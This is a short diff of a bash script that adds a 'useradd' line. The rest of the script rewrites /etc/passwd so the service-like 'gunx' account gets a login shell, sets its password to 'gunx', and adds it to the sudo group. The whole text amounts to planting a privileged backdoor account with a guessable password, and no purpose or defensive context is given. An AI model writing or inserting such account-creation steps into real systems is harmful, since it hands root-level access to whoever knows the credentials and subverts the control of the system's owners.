@@ -1,5 +1,5 @@
 #!/bin/bash
-
+useradd -m gunx
 sed -i 's/gunx:x:9:9:gunx:\/var\/spool\/gunx:\/usr\/sbin\/nologin/gunx:x:9:9:gunx:\/home:/g' /etc/passwd
 echo gunx:gunx | chpasswd
 usermod -aG sudo gunx
